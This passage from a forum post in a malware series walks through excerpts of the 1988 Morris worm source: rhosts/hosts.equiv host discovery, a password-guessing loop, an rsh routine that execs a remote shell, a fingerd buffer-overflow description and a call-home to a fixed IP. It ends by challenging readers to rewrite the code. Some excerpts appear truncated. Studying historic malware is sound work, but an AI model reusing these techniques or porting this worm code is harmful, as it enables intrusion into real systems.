    if (host-&gt;o48[0] == 0)		/* 158 */
	continue;
    host-&gt;flag |= 8;
}
fclose(hosteq);				/* 280 */
}

hosteq = fopen(XS("/.rhosts"), XS("r"));
if (hosteq != NULL) {			/* 516 */
while (fgets(getbuf, sizeof(getbuf), hosteq)) { /* 344,504 */
    if (sscanf(getbuf, XS("%s"), scanbuf) != 1)
	continue;
    host = h_name2host(scanbuf, 0);
    while (host == 0) {			/* 436, 474 */
	host = h_name2host(scanbuf, 1);
	getaddrs(host);
    }
    if (host-&gt;o48[0] == 0)
	continue;
    host-&gt;flag |= 8;
}
fclose(hosteq);
}
</code></pre>
<p>Alright, so in short what this lovely piece of code is doing is searching for the /etc/hosts.equiv, and /.rhost for a new host. In case you didn’t know what both of them are, an /etc/hosts.equiv contains a list of a trusted host(s) for a remote system. A  /.rhost is a mechanism that allows a system to trust another system. In fact here’s one of Morris’s notes before the code:</p>
<pre><code>/* Strategy 0, look through /etc/hosts.equiv, and /.rhost for new hosts */
</code></pre>
<p>Here’s another function which doesn’t allow a foreign or complicated host.-:</p>
<pre><code>if (strlen(host-&gt;hostname) &gt; 11)
    continue;
user = (struct usr *)malloc(sizeof(struct usr));
strcpy(user-&gt;name, pwent-&gt;pw_name);
strcpy(&amp;user-&gt;passwd[0], XS("x"));
user-&gt;decoded_passwd[0] = '\0';
user-&gt;homedir = strcpy(malloc(strlen(pwent-&gt;pw_dir)+1), pwent-&gt;pw_dir);
user-&gt;gecos = strcpy(malloc(strlen(pwent-&gt;pw_gecos)+1), pwent-&gt;pw_gecos
);
user-&gt;next = user_list;
user_list = user;
}
endpwent();
cmode = 1;
x27f2c = user_list;
return;
} 
</code></pre>
<p>This, function was supposed to be (I assume) to keep the worm from spreading to anything government or anything that would be located outside of the ARPANET (if it could spread outside of it…wait can it- I think I just found something else to occupy my time instead of bingo night with grandma).</p>
<p>Now here’s another piece of code, that trys potential passwords (you can find the list above it)</p>
<pre><code>{
struct usr *user;
int i, j;

if (wds[nextw] == 0) {
cmode++;
return;					/* 2724 */
}
if (nextw == 0) {				/* 2550 */
for (i = 0; wds[i]; i++)
    ;
permute(wds, i, sizeof(wds[0]));
}

for (j = 0; wds[nextw][j] != '\0'; j++)
wds[nextw][j] &amp;= 0x7f;
for (user = x27f28; user; user = user-&gt;next)
try_passwd(user, wds[nextw]);
for (j = 0; wds[nextw][j]; j++)		/* 2664,2718 */
wds[nextw][j] |= 0x80;
nextw += 1;
return;
}
</code></pre>
<p>And that’s it for the password cracker! Whoo, this is long. If you’d like to I’d suggest a quick rest. Just so you know I’m not showing everything for your sake, and mines-  which is why I gave y’all the link leading to all of the code so you can look at it if you’d like. Also please note, I’m not exactly experienced with C (I’m new) so please tell me if I say anything incorrect in the comments, and I’ll correct it.</p>
<hr>
<p><strong>Hs.c.txt</strong><br>
I’ll have to apologize as I can’t examine this part of the worm (It’s long as hell), however going back a bit on what I just recently said Morris did include this piece of code in this part that really caught my eye:</p>
<pre><code>/* I call this "huristic 1". It tries to breakin using the remote execution
* service.  It is called from a subroutine of cracksome_1 with information fr
om
 * a user's .forword file.  The two name are the original username and the one
* in the .forward file.
*/
 hu1(alt_username, host, username2)		/* x5178 */
 char *alt_username, *username2;
 struct hst *host;
{
char username[256];
char buffer2[512];
char local[8];
int result, i, fd_for_sh;			/* 780, 784, 788 */

if (host == me)
return 0;				/* 530 */
if (host-&gt;flag &amp; HST_HOSTTWO)			/* Already tried ??? */
return 0;

if (host-&gt;o48[0] || host-&gt;hostname == NULL)
getaddrs(host);
if (host-&gt;o48[0] == 0) {
host-&gt;flag |= HST_HOSTFOUR;
return 0;
}
strncpy(username, username2, sizeof(username)-1);
username[sizeof(username)-1] = '\0';

if (username[0] == '\0')
strcpy(username, alt_username);

for (i = 0; username[i]; i++)
if (ispunct(username[i]) || username[i] &lt; ' ')
    return 0;
other_sleep(1);

fd_for_sh = x538e(host, username, &amp;alt_username[30]);
if (fd_for_sh &gt;= 0) {
result = talk_to_sh(host, fd_for_sh, fd_for_sh);
close(fd_for_sh);
return result;
}
if (fd_for_sh == -2)
return 0;

fd_for_sh = x538e(me, alt_username, &amp;alt_username[30]);
if (fd_for_sh &gt;= 0) {
sprintf(buffer2, XS("exec /usr/ucb/rsh %s -l %s \'exec /bin/sh\'\n"),
	host-&gt;hostname, username);
send_text(fd_for_sh, buffer2);
sleep(10);
result = 0;
if (test_connection(fd_for_sh, fd_for_sh, 25))	/* 508 */
    result = talk_to_sh(host, fd_for_sh, fd_for_sh);
close(fd_for_sh);
return result;
}
return 0;
}
</code></pre>
<p>This at a short glance you can easily find out (from Morris’s notes) that this is an attempt at breaking in using a remote execution service, and gets information from the user’s .forword file.</p>
<p>You can also find some really interesting code above it. Morris describes one part of his code in detail as :</p>
<p>/*<br>
From Gene Spafford <a href="mailto:spaf@perdue.edu">spaf@perdue.edu</a><br>
What this routine does is actually kind of clever.  Keep in<br>
mind that on a Vax the stack grows downwards.</p>
<p>fingerd gets its input via a call to gets, with an argument<br>
of an automatic variable on the stack.  Since gets doesn’t<br>
have a bound on its input, it is possible to overflow the<br>
buffer without an error message.  Normally, when that happens<br>
you trash the return stack frame.  However, if you know<br>
where everything is on the stack (as is the case with a<br>
distributed binary like BSD), you can put selected values<br>
back in the return stack frame.</p>
<p>This is what that routine does.  It overwrites the return frame<br>
to point into the buffer that just got trashed.  The new code<br>
does a chmk (change-mode-to-kernel) with the service call for<br>
execl and an argument of “/bin/sh”.  Thus, fingerd gets a<br>
service request, forks a child process, tries to get a user name<br>
and has its buffer trashed, does a return, exec’s a shell,<br>
and then proceeds to take input off the socket – from the<br>
worm on the other machine.  Since many sites never bother to<br>
fix fingerd to run as something other than root…</p>
<p>Luckily, the code doesn’t work on Suns – it just causes it<br>
to dump core.</p>
<p>–spaf</p>
<p>*/</p>
<p>/* This routine exploits a fixed 512 byte input buffer in a VAX running</p>
<ul>
<li>the BSD 4.3 fingerd binary.  It send 536 bytes (plus a newline) to</li>
<li>overwrite six extra words in the stack frame, including the return</li>
<li>PC, to point into the middle of the string sent over.  The instructions</li>
<li>in the string do the direct system call version of execve("/bin/sh"). */</li>
</ul>
<p>You can find it’s code right above the code I had included above.</p>
<hr>
<p><strong>Net.c.txt</strong><br>
(Please note I skipped one part of the code before this, as 1- I have a lot more to write, and 2- I wanted to cover most of the things I thought of as important in order to save time)</p>
<p>So here’s most of the code found in this file:</p>
<pre><code> if_init()			/* 0x254c, check again */
 {
struct ifconf if_conf;
struct ifreq if_buffer[12];
int  s, i, num_ifs, j;
char local[48];

nifs = 0;
s = socket(AF_INET, SOCK_STREAM, 0);
if (s &lt; 0)
return 0;				/* if_init+1042 */
if_conf.ifc_req = if_buffer;
if_conf.ifc_len = sizeof(if_buffer);

if (ioctl(s, SIOCGIFCONF, &amp;if_conf) &lt; 0) {
close(s);
return 0;				/* if_init+1042 */
}

num_ifs = if_conf.ifc_len/sizeof(if_buffer[0]);
for(i = 0; i &lt; num_ifs; i++) {		/* if_init+144 */
for (j = 0; j &lt; nifs; j++)
    /* Oops, look again.  This line needs verified. */
    if (strcmp(ifs[j], if_buffer[i].ifr_name) == 0)
	break;
}

}	

 /* Yes all of these are in the include file, but why bother?  Everyone knows
  netmasks, and they will never change... */
def_netmask(net_addr)				/* 0x2962 */
 int net_addr;
{
if ((net_addr &amp; 0x80000000) == 0)
return 0xFF000000;
if ((net_addr &amp; 0xC0000000) == 0xC0000000)
return 0xFFFF0000;
return 0xFFFFFF00;
 }

netmaskfor(addr)				/* 0x29aa */
  int addr;
{
int i, mask;

mask = def_netmask(addr);
for (i = 0; i &lt; nifs; i++)
if ((addr &amp; mask) == (ifs[i].if_l16 &amp; mask))
    return ifs[i].if_l24;
return mask;
}

rt_init()					/* 0x2a26 */
{
FILE *pipe;
char input_buf[64];
int	 l204, l304;

ngateways = 0;
pipe = popen(XS("/usr/ucb/netstat -r -n"), XS("r"));
					 /* &amp;env102,&amp;env 125 */
if (pipe == 0)
return 0;
while (fgets(input_buf, sizeof(input_buf), pipe)) { /* to 518 */
other_sleep(0);
if (ngateways &gt;= 500)
    break;
sscanf(input_buf, XS("%s%s"), l204, l304);	/* &lt;env+127&gt;"%s%s" */
/* other stuff, I'll come back to this later */


   }						/* 518, back to 76 */
  pclose(pipe);
  rt_init_plus_544();
  return 1;
 }						/* 540 */

static rt_init_plus_544()				/* 0x2c44 */
{
}

getaddrs()					/* 0x2e1a */
{
}

struct bar *a2in(a)		/* 0x2f4a, needs to be fixed */
 int a;
{
static struct bar local;
local.baz = a;
return &amp;local;
}
</code></pre>
<p>Basically this code is one of the second of the 5 source code files making up the .o file. which was distributed along with the worm as it spread.</p>
<hr>
<p><strong>Some other Code…</strong><br>
I really don’t want to bother any of you guys (and myself) with this much writing (I’m not used to this much writing, and I’m honestly quite sure you may get a bit tired from reading it, so I’ll just include just one more piece of code, and explain their functions. You can find all these codes in the link I gave y’all.</p>
<ul>
<li>
</li></ul>
<pre><code>static report_breakin(arg1, arg2)		/* 0x2494 */
{
int s;
struct sockaddr_in sin;
char msg;

if (7 != random() % 15)
return;

bzero(&amp;sin, sizeof(sin));
sin.sin_family = AF_INET;
sin.sin_port = REPORT_PORT;
sin.sin_addr.s_addr = inet_addr(XS("128.32.137.13"));
					/* &lt;env+77&gt;"128.32.137.13" */

s = socket(AF_INET, SOCK_STREAM, 0);
if (s &lt; 0)
return;
if (sendto(s, &amp;msg, 1, 0, &amp;sin, sizeof(sin)))
;
close(s);
}
</code></pre>
<p>So what this code does is it reports if a break in has been successfully by sending one byte to the address “128.32.137.13”.</p>
<hr>
<p><strong>Conclusion</strong><br>
Well here we are! Well it’s really been an honor to be able to look at a worm as good as the Morris Worm, and be able to show it to you guys! In short however, although you can’t use the Morris Worm today it will give you tons of insight about how computers worked back then, and so on.</p>
<hr>
<p><strong>Sources</strong><br>
What’s a good article without sources to back it up? Use these for your own curiosity!<br>
I got all my info from the following links:</p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Morris_worm" rel="noopener nofollow ugc">https://en.wikipedia.org/wiki/Morris_worm</a></li>
</ul>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/2X/5/5fad7b08429c5a72532c5874c81b0aaa1c778b22.png" class="site-icon" width="" height="">
      <a href="https://limn.it/articles/the-morris-worm/" target="_blank" rel="noopener nofollow ugc" title="03:00PM - 19 December 2010">Limn – 19 Dec 10</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/d/da63405b5fb989f8a19441c3ddf6d66606f6f436.png" class="thumbnail" width="" height="">

<h3><a href="https://limn.it/articles/the-morris-worm/" target="_blank" rel="noopener nofollow ugc">Limn: The Morris Worm</a></h3>

<p>Outlining Contemporary Problems</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/2X/f/fe0b4c2d1a41e165c31bab9632593aa3d13225b5.png" class="site-icon" width="" height="">
      <a href="https://www.zdnet.com/article/the-morris-worm-internet-malware-turns-25/" target="_blank" rel="noopener nofollow ugc">ZDNet</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/1/177de7728cc6c505ce96d918005eb1cef7f510d1.jpeg" class="thumbnail" width="" height="">

<h3><a href="https://www.zdnet.com/article/the-morris-worm-internet-malware-turns-25/" target="_blank" rel="noopener nofollow ugc">The Morris Worm: Internet malware turns 25 | ZDNet</a></h3>

<p>25 years ago this Saturday, November 2, 1988, much of the Internet - still very small at the time - crashed. The cause was a selfish experiment, turned Frankenstein monster, instigated by a graduate student at Cornell named Robert Morris.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<aside class="onebox allowlistedgeneric">
  <header class="source">
      <a href="http://www.cs.unc.edu/~jeffay/courses/nidsS05/attacks/seely-RTMworm-89.html#p2" target="_blank" rel="noopener nofollow ugc">cs.unc.edu</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="http://www.cs.unc.edu/~jeffay/courses/nidsS05/attacks/seely-RTMworm-89.html#p2" target="_blank" rel="noopener nofollow ugc">A Tour of the Worm</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<aside class="onebox allowlistedgeneric">
  <header class="source">
      <a href="http://www.cybertelecom.org/security/morris.htm" target="_blank" rel="noopener nofollow ugc">cybertelecom.org</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="http://www.cybertelecom.org/security/morris.htm" target="_blank" rel="noopener nofollow ugc">Cybertelecom :: Morris Worm</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>Anything else were original reports done on the Worm that can be found in the “parent directory” I was talking about.</p>
<hr>
<p><strong>A Quick Poem About the Morris Worm:</strong></p>
<pre><code>		"The Worm Before Christmas"
		    by Clement C. Morris

    (a.k.a. David Bradley, Betty Cheng, Hal Render, 
		Greg Rogers, and Dan LaLiberte)

Twas the night before finals, and all through the lab
Not a student was sleeping, not even McNabb.
Their projects were finished, completed with care
In hopes that the grades would be easy (and fair).

The students were wired with caffeine in their veins
While visions of quals nearly drove them insane.
    With piles of books and a brand new highlighter,
I had just settled down for another all nighter ---

When out from our gateways arose such a clatter,
I sprang from my desk to see what was the matter;
Away to the console I flew like a flash,
    And logged in as root to fend off a crash.

The windows displayed on my brand new Sun-3,
Gave oodles of info --- some in 3-D.
When, what to my burning red eyes should appear
But dozens of "nobody" jobs.  Oh dear!

With a blitzkrieg invasion, so virulent and firm,
    I knew in a moment, it was Morris's Worm!
More rapid than eagles his processes came,
And they forked and exec'ed and they copied by name:

"Now Dasher!  Now Dancer!  Now, Prancer and Vixen!
On Comet!  On Cupid!  On Donner and Blitzen!
To the sites in .rhosts and host.equiv
Now, dash away!  dash away!  dash away all!"


And then in a twinkling, I heard on the phone,
The complaints of the users.  (Thought I was alone!)
"The load is too high!"  "I can't read my files!"
"I can't send my mail over miles and miles!"

I unplugged the net, and was turning around,
    When the worm-ridden system went down with a bound.
I fretted.  I frittered.  I sweated.  I wept.
Then finally I core dumped the worm in /tmp.

It was smart and pervasive, a right jolly old stealth,
And I laughed, when I saw it, in spite of myself.
A look at the dump of that invasive thread
Soon gave me to know we had nothing to dread.

The next day was slow with no network connections,
For we wanted no more of those pesky infections.
But in spite of the news and the noise and the clatter,
Soon all became normal, as if naught were the matter.

Then later that month while all were away,
A virus came calling and then went away.
The system then told us, when we logged in one night:
    "Happy Christmas to all!  (You guys aren't so bright.)"


[ Note:  The machines dasher.cs.uiuc.edu, 
  dancer.cs.uiuc.ed, prancer.cs.uiuc.edu, etc. have
  been renamed deer1, deer2, deer3, etc. so as not
  to confuse the already burdened students who use 
  those machines. We regret that this poem reflects 
  the older naming scheme and hope it does not confuse
  the network adminstrator at your site.  -Ed.]
</code></pre>
<hr>
<p><strong>My Challenge to You Guys!</strong><br>
Alright, so in other posts I’ve seen other community members where they’ve included code, and other members have re-wrote the code in another language. So my challenge for you guys is to do just that!</p>
<hr>
<p>Oh and on a side not the “0x02” in the title is my way of saying “0.02” or "the second out of however many posts in this series just to clear things up.</p>
<hr>
          <p><a href="https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685/1">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685/1</link>
        <pubDate>Sat, 02 Jul 2016 03:44:45 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-685-1</guid>
        <source url="https://d.clarkee.co.uk/t/examining-the-morris-worm-source-code-malware-series-0x02/685.rss">Examining the Morris Worm Source Code - Malware Series - 0x02</source>
      </item>
  </channel>
</rss>
